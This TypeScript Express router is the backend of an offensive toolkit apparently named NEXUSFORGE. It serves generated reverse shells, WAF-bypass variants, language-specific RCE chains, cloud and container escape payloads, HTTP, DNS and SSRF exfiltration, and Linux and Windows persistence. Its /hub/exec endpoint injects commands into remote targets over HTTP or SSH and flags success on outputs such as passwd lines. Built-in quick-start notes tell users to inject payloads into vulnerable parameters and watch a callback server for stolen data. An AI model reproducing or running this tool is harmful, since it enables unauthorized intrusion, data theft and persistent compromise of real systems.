import { Router, type IRouter, type Request, type Response } from "express";
import {
  applyQuantumBypass,
  buildPayloadVariants,
  buildPolymorphicPayload,
  buildWafBypass,
  buildReverseShells,
  buildChunkedBypass,
  buildCloudMetaPayloads,
  buildContainerEscapes,
  buildContextPayloads,
  buildParameterPollution,
  isSelfTarget,
  buildPhpRceChains,
  buildNodeRceChains,
  buildJavaRceChains,
  buildPythonRceChains,
  buildWindowsRceChains,
  buildMassiveBypass,
  buildDirectInjectionPayloads,
  buildAdaptivePayloads,
  buildScanningPayloads,
} from "../lib/bypassEngine.js";
import {
  buildInjectionReadyExfil,
  buildInjectionReadyPersist,
  buildRCEAutoChain,
  buildWafBypassWrappers,
} from "../lib/autoDeliveryChain.js";
import {
  buildHttpExfil,
  buildDnsExfil,
  buildWindowsExfil,
  buildSsrfExfil,
  buildInjectionReadyExfilWrapped,
} from "../lib/exfilEngine.js";
import {
  buildLinuxPersistence,
  buildWindowsPersistence,
  buildDeliveryPayloads,
  buildExtendedLinuxPersistence,
  buildExtendedWindowsPersistence,
} from "../lib/persistenceEngine.js";
import { logInjection } from "../lib/injectionLogger.js";
import { generateSuggestions } from "../lib/payloadAI.js";
import { sshExec } from "../lib/sshExec.js";

const router: IRouter = Router();

const ALL_MODES = [
  "classic","blind","oob","quantum","polymorphic","ifs","concat","hex","b64loop","env",
  "heredoc","unicode","null","wildcard","comment","double_enc",
  "brace","process_sub","arith","ansi_c","rev",
  "ssti","log4shell","xxe","polyglot",
  "rev_shell","cloud","container",
  "timing","stealth",
  "windows_timing","windows_rev","windows","antiforensics",
];

const ALL_ENGINES = [
  "bash","node","python","php","java","cpp","powershell","ruby","perl",
  "php_rce","node_rce","java_rce","python_rce","windows_rce",
];

const ENGINES_STATIC: Record<string, boolean> = {
  bash: true, node: true, python: true, php: true, java: true,
  cpp: true, powershell: true, ruby: true, perl: true,
  php_rce: true, node_rce: true, java_rce: true, python_rce: true, windows_rce: true,
};

router.get("/hub/health", (_req: Request, res: Response) => {
  res.json({
    status: "online",
    version: "10.0.0",
    timestamp: new Date().toISOString(),
    engines: ALL_ENGINES,
    modes: ALL_MODES,
    features: [
      "http_injection","ssh_exec","oob_exfil","dns_exfil","windows_exfil",
      "ssrf_exfil","injection_ready_exfil","injection_ready_persist",
      "rce_auto_chain","php_rce","node_rce","java_rce","python_rce","windows_rce",
      "massive_bypass","direct_injection","adaptive_payloads","scanning_payloads",
      "linux_persist","windows_persist","extended_linux_persist","extended_windows_persist",
    ],
  });
});

router.get("/hub/engines", (_req: Request, res: Response) => {
  res.json(ENGINES_STATIC);
});

router.post("/hub/bypass", (req: Request, res: Response) => {
  const { payload = "id" } = req.body as { payload?: string };
  res.json({ variants: buildWafBypass(payload) });
});

router.post("/hub/suggest", (req: Request, res: Response) => {
  const { mode, cmd = "id", attackerIp = "127.0.0.1", attackerPort = "4444" } =
    req.body as { mode?: string; cmd?: string; attackerIp?: string; attackerPort?: string };
  res.json({ suggestions: generateSuggestions(mode, cmd, attackerIp, attackerPort) });
});

router.post("/hub/shells", (req: Request, res: Response) => {
  const { attackerIp = "127.0.0.1", attackerPort = "4444" } =
    req.body as { attackerIp?: string; attackerPort?: string };
  res.json({ shells: buildReverseShells(attackerIp, attackerPort), count: buildReverseShells(attackerIp, attackerPort).length });
});

router.post("/hub/chunked", (req: Request, res: Response) => {
  const { payload = "id", chunkSize = 16 } =
    req.body as { payload?: string; chunkSize?: number };
  res.json({ variants: buildChunkedBypass(payload, Number(chunkSize)) });
});

router.post("/hub/cloud", (req: Request, res: Response) => {
  const { cmd = "id" } = req.body as { cmd?: string };
  res.json({ payloads: buildCloudMetaPayloads(cmd) });
});

router.post("/hub/container", (req: Request, res: Response) => {
  const { cmd = "id" } = req.body as { cmd?: string };
  res.json({ payloads: buildContainerEscapes(cmd) });
});

router.post("/hub/context", (req: Request, res: Response) => {
  const {
    cmd          = "id",
    os           = "unknown",
    waf          = null,
    language     = "",
    attackerIp   = "127.0.0.1",
    attackerPort = "4444",
  } = req.body as {
    cmd?: string; os?: "windows" | "linux" | "unknown"; waf?: string | null;
    language?: string; attackerIp?: string; attackerPort?: string;
  };
  const payloads = buildContextPayloads(cmd, os, waf ?? null, language, attackerIp, attackerPort);
  res.json({ payloads, count: payloads.length, context: { os, waf, language } });
});

router.post("/hub/pollution", (req: Request, res: Response) => {
  const { param = "cmd", payload = "id" } = req.body as { param?: string; payload?: string };
  res.json({ variants: buildParameterPollution(param, payload) });
});

/* ── NEW: Language-specific RCE chains ──────────────────────────────────── */
router.post("/hub/php-rce", (req: Request, res: Response) => {
  const { cmd = "id" } = req.body as { cmd?: string };
  const chains = buildPhpRceChains(cmd);
  res.json({ chains, count: chains.length, engine: "php" });
});

router.post("/hub/node-rce", (req: Request, res: Response) => {
  const { cmd = "id" } = req.body as { cmd?: string };
  const chains = buildNodeRceChains(cmd);
  res.json({ chains, count: chains.length, engine: "node" });
});

router.post("/hub/java-rce", (req: Request, res: Response) => {
  const { cmd = "id" } = req.body as { cmd?: string };
  const chains = buildJavaRceChains(cmd);
  res.json({ chains, count: chains.length, engine: "java" });
});

router.post("/hub/python-rce", (req: Request, res: Response) => {
  const { cmd = "id" } = req.body as { cmd?: string };
  const chains = buildPythonRceChains(cmd);
  res.json({ chains, count: chains.length, engine: "python" });
});

router.post("/hub/win-rce", (req: Request, res: Response) => {
  const { cmd = "whoami" } = req.body as { cmd?: string };
  const chains = buildWindowsRceChains(cmd);
  res.json({ chains, count: chains.length, engine: "windows" });
});

/* ── NEW: Massive WAF bypass ──────────────────────────────────────────────── */
router.post("/hub/massive-bypass", (req: Request, res: Response) => {
  const { cmd = "id" } = req.body as { cmd?: string };
  const variants = buildMassiveBypass(cmd);
  res.json({ variants, count: variants.length });
});

/* ── NEW: Direct injection payloads ─────────────────────────────────────── */
router.post("/hub/inject-payloads", (req: Request, res: Response) => {
  const { cmd = "id" } = req.body as { cmd?: string };
  const payloads = buildDirectInjectionPayloads(cmd);
  res.json({ payloads, count: payloads.length });
});

/* ── NEW: Adaptive payloads (tool-aware) ──────────────────────────────────── */
router.post("/hub/adaptive", (req: Request, res: Response) => {
  const { cmd = "id", tools = [] } = req.body as { cmd?: string; tools?: string[] };
  const allTools = tools.length > 0 ? tools : ["bash","python3","perl","ruby","node","curl","wget","nc","php","awk","sed","find","base64","openssl"];
  const payloads = buildAdaptivePayloads(cmd, allTools);
  res.json({ payloads, count: payloads.length, tools: allTools });
});

/* ── NEW: Scanning/canary payloads ────────────────────────────────────────── */
router.post("/hub/scan-payloads", (req: Request, res: Response) => {
  const { attackerIp = "127.0.0.1", attackerPort = "4444" } =
    req.body as { attackerIp?: string; attackerPort?: string };
  const payloads = buildScanningPayloads(attackerIp, attackerPort);
  res.json({ payloads, count: payloads.length });
});

/* ── NEW: Exfil endpoints ─────────────────────────────────────────────────── */
router.post("/hub/exfil/http", (req: Request, res: Response) => {
  const { cbUrl = "http://127.0.0.1:4444", token = "nx" } =
    req.body as { cbUrl?: string; token?: string };
  const payloads = buildHttpExfil(cbUrl, token);
  res.json({ payloads, count: payloads.length });
});

router.post("/hub/exfil/dns", (req: Request, res: Response) => {
  const { domain = "oob.example.com" } = req.body as { domain?: string };
  const payloads = buildDnsExfil(domain);
  res.json({ payloads, count: payloads.length });
});

router.post("/hub/exfil/windows", (req: Request, res: Response) => {
  const { cbUrl = "http://127.0.0.1:4444", token = "nx" } =
    req.body as { cbUrl?: string; token?: string };
  const payloads = buildWindowsExfil(cbUrl, token);
  res.json({ payloads, count: payloads.length });
});

router.post("/hub/exfil/ssrf", (req: Request, res: Response) => {
  const { cbUrl = "http://127.0.0.1:4444", token = "nx" } =
    req.body as { cbUrl?: string; token?: string };
  const payloads = buildSsrfExfil(cbUrl, token);
  res.json({ payloads, count: payloads.length });
});

/* ── THE KEY FIX: Injection-ready exfil (no pre-existing RCE needed) ─── */
router.post("/hub/exfil/injection-ready", (req: Request, res: Response) => {
  const { cbUrl = "http://127.0.0.1:4444", token = "nx" } =
    req.body as { cbUrl?: string; token?: string };
  const payloads = [
    ...buildInjectionReadyExfil(cbUrl, token),
    ...buildInjectionReadyExfilWrapped(cbUrl, token),
  ];
  res.json({
    payloads,
    count: payloads.length,
    note: "These payloads go directly into an HTTP injection param — no pre-existing shell access needed.",
    usage: "Inject the `injectionValue` field into a vulnerable GET/POST parameter. Use `ifsEncoded` for WAF bypass.",
  });
});

/* ── NEW: Persistence endpoints ─────────────────────────────────────────── */
router.post("/hub/persist/linux", (req: Request, res: Response) => {
  const { lhost = "127.0.0.1", lport = "4444", cmd = "id" } =
    req.body as { lhost?: string; lport?: string; cmd?: string };
  const base = buildLinuxPersistence(lhost, lport, cmd);
  const extended = buildExtendedLinuxPersistence(lhost, lport, cmd);
  const payloads = [...base, ...extended];
  res.json({ payloads, count: payloads.length });
});

router.post("/hub/persist/windows", (req: Request, res: Response) => {
  const { lhost = "127.0.0.1", lport = "4444", cmd = "whoami" } =
    req.body as { lhost?: string; lport?: string; cmd?: string };
  const base = buildWindowsPersistence(lhost, lport, cmd);
  const extended = buildExtendedWindowsPersistence(lhost, lport, cmd);
  const payloads = [...base, ...extended];
  res.json({ payloads, count: payloads.length });
});

router.post("/hub/persist/delivery", (req: Request, res: Response) => {
  const { lhost = "127.0.0.1", lport = "4444" } =
    req.body as { lhost?: string; lport?: string };
  const payloads = buildDeliveryPayloads(lhost, lport);
  res.json({ payloads, count: payloads.length });
});

/* ── THE KEY FIX: Injection-ready persistence (no pre-existing RCE needed) */
router.post("/hub/persist/injection-ready", (req: Request, res: Response) => {
  const { lhost = "127.0.0.1", lport = "4444" } =
    req.body as { lhost?: string; lport?: string };
  const payloads = buildInjectionReadyPersist(lhost, lport);
  res.json({
    payloads,
    count: payloads.length,
    note: "These payloads go directly into an HTTP injection param — install persistence in one HTTP request.",
    usage: "Inject the `injectionValue` field into a vulnerable GET/POST parameter. Use `b64Wrapped` for WAF bypass.",
  });
});

/* ── NEW: RCE auto-chain (the biggest fix) ───────────────────────────────── */
router.post("/hub/rce-chain", (req: Request, res: Response) => {
  const { cbUrl = "http://127.0.0.1:4444", token = "nx", lhost = "127.0.0.1", lport = "4444" } =
    req.body as { cbUrl?: string; token?: string; lhost?: string; lport?: string };
  const chains = buildRCEAutoChain(cbUrl, token, lhost, lport);
  res.json({
    chains,
    count: chains.length,
    note: "Each chain: RCE → recon → exfil in one injection. Drop `injectionValue` directly into injection param.",
  });
});

/* ── NEW: Full auto-deliver (combines all injection-ready payloads) ─────── */
router.post("/hub/autodeliver", (req: Request, res: Response) => {
  const {
    cbUrl    = "http://127.0.0.1:4444",
    token    = "nx",
    lhost    = "127.0.0.1",
    lport    = "4444",
    category = "all",
  } = req.body as {
    cbUrl?: string; token?: string; lhost?: string; lport?: string;
    category?: "exfil" | "persist" | "rce_chain" | "all";
  };

  const exfilPayloads   = buildInjectionReadyExfil(cbUrl, token);
  const exfilWrapped    = buildInjectionReadyExfilWrapped(cbUrl, token);
  const persistPayloads = buildInjectionReadyPersist(lhost, lport);
  const rceChains       = buildRCEAutoChain(cbUrl, token, lhost, lport);

  let out;
  if (category === "exfil") {
    out = { exfil: [...exfilPayloads, ...exfilWrapped] };
  } else if (category === "persist") {
    out = { persist: persistPayloads };
  } else if (category === "rce_chain") {
    out = { rce_chains: rceChains };
  } else {
    out = {
      exfil:      [...exfilPayloads, ...exfilWrapped],
      persist:    persistPayloads,
      rce_chains: rceChains,
    };
  }

  const total = (out.exfil?.length ?? 0) + (out.persist?.length ?? 0) + (out.rce_chains?.length ?? 0);
  res.json({
    ...out,
    total,
    architecture_note: "INJECTION-READY: All payloads go directly into HTTP params. No pre-existing RCE needed. Use `injectionValue` for direct injection, `ifsEncoded` for space-based WAF bypass, `b64Wrapped` for keyword WAF bypass.",
    quick_start: {
      step1: "Choose a payload from `exfil` or `rce_chains`",
      step2: "Take the `injectionValue` field",
      step3: `Inject it into: GET /target?vuln_param=INJECT_HERE or POST body: vuln_param=INJECT_HERE`,
      step4: `Watch your callback server at ${cbUrl} for incoming data`,
    },
  });
});

/* ── WAF bypass wrappers for any payload ─────────────────────────────────── */
router.post("/hub/waf-wrappers", (req: Request, res: Response) => {
  const { cbUrl = "http://127.0.0.1:4444", token = "nx", payloadId } =
    req.body as { cbUrl?: string; token?: string; payloadId?: string };
  const exfilPayloads = buildInjectionReadyExfil(cbUrl, token);
  const found = exfilPayloads.find(p => p.id === payloadId);
  if (!found) {
    const first = exfilPayloads[0]!;
    res.json({ wrappers: buildWafBypassWrappers(first), payloadId: first.id });
    return;
  }
  res.json({ wrappers: buildWafBypassWrappers(found), payloadId: found.id });
});

/* ─── Main /hub/exec endpoint (unchanged + improved) ────────────────────── */
router.post("/hub/exec", async (req: Request, res: Response) => {
  const start = Date.now();
  const {
    cmd,
    engine        = "bash",
    mode          = "classic",
    targetUrl,
    injectParam   = "cmd",
    httpMethod    = "GET",
    customHeaders = "",
    attackerIp    = "127.0.0.1",
    attackerPort  = "4444",
    sshHost,
    sshPort       = 22,
    sshUser       = "root",
    sshPassword,
    sshKey,
  } = req.body as {
    cmd?: string; engine?: string; mode?: string;
    targetUrl?: string; injectParam?: string; httpMethod?: string; customHeaders?: string;
    attackerIp?: string; attackerPort?: string;
    sshHost?: string; sshPort?: number; sshUser?: string; sshPassword?: string; sshKey?: string;
  };

  if (!cmd || typeof cmd !== "string" || !cmd.trim()) {
    res.status(400).json({ error: "cmd is required" });
    return;
  }
  if (!targetUrl && !sshHost) {
    res.status(400).json({
      error: "targetUrl or sshHost required",
      hint: "NEXUSFORGE executes on remote targets only. Provide targetUrl for HTTP injection or sshHost+sshUser for SSH execution.",
    });
    return;
  }

  const processed = applyQuantumBypass(cmd, mode, attackerIp, attackerPort);

  try {
    if (sshHost?.trim()) {
      const result = await sshExec(
        {
          host:       sshHost.trim(),
          port:       Number(sshPort) || 22,
          username:   (sshUser ?? "root").trim(),
          password:   sshPassword?.trim() || undefined,
          privateKey: sshKey?.trim() || undefined,
          timeoutMs:  30_000,
        },
        processed,
      );
      const elapsed = Date.now() - start;
      void logInjection(cmd, `ssh/${engine}`, mode, elapsed);
      res.json({ output: result.output, exitCode: result.exitCode, engine: `ssh/${engine}`, mode, elapsed, processed });
      return;
    }

    if (isSelfTarget(targetUrl!)) {
      res.status(400).json({ error: "Self-targeting is disabled — configure an external target URL." });
      return;
    }

    let parsedUrl: URL;
    try { parsedUrl = new URL(targetUrl!); } catch {
      res.status(400).json({ error: `Invalid targetUrl: ${targetUrl}` });
      return;
    }

    const variants = mode === "polymorphic"
      ? [buildPolymorphicPayload(cmd, "quantum")]
      : buildPayloadVariants(processed);
    const payload  = variants[0] ?? processed;
    const method   = httpMethod.toUpperCase();

    const hdrs: Record<string, string> = {
      "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
      "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Cache-Control":   "no-cache",
    };
    for (const line of (customHeaders ?? "").split(/\r?\n/)) {
      const sep = line.indexOf(":");
      if (sep > 0) hdrs[line.slice(0, sep).trim()] = line.slice(sep + 1).trim();
    }

    let fetchUrl:  string;
    let fetchBody: string | undefined;

    if (method === "GET" || method === "DELETE") {
      parsedUrl.searchParams.set(injectParam, payload);
      fetchUrl = parsedUrl.toString();
    } else if (method === "JSON") {
      hdrs["Content-Type"] = "application/json";
      fetchUrl  = parsedUrl.toString();
      fetchBody = JSON.stringify({ [injectParam]: payload });
    } else {
      hdrs["Content-Type"] = "application/x-www-form-urlencoded";
      fetchUrl  = parsedUrl.toString();
      fetchBody = new URLSearchParams({ [injectParam]: payload }).toString();
    }

    const response = await fetch(fetchUrl, {
      method:  method === "JSON" ? "POST" : method,
      headers: hdrs,
      body:    fetchBody,
      signal:  AbortSignal.timeout(30_000),
    });
    const text    = await response.text();
    const elapsed = Date.now() - start;
    void logInjection(cmd, engine, mode, elapsed);

    const confirmed =
      /uid=\d+\(\w+\)\s+gid=\d+/.test(text)           ||
      /root:x:0:0:/.test(text)                          ||
      /Linux \S+ \d+\.\d+\.\d+/.test(text)              ||
      /Microsoft Windows \[Version \d/.test(text)        ||
      /\bNT AUTHORITY\\\w+/.test(text)                  ||
      /^PATH=\//m.test(text) || /^HOME=\//m.test(text)  ||
      (/total \d+/.test(text) && /drwx/.test(text));

    res.json({ output: text.slice(0, 8192), status: response.status, confirmed, engine, mode, elapsed, processed, payload });

  } catch (e: unknown) {
    const msg = (e as Error).message ?? String(e);
    res.status(500).json({ error: msg });
  }
});

export default router;
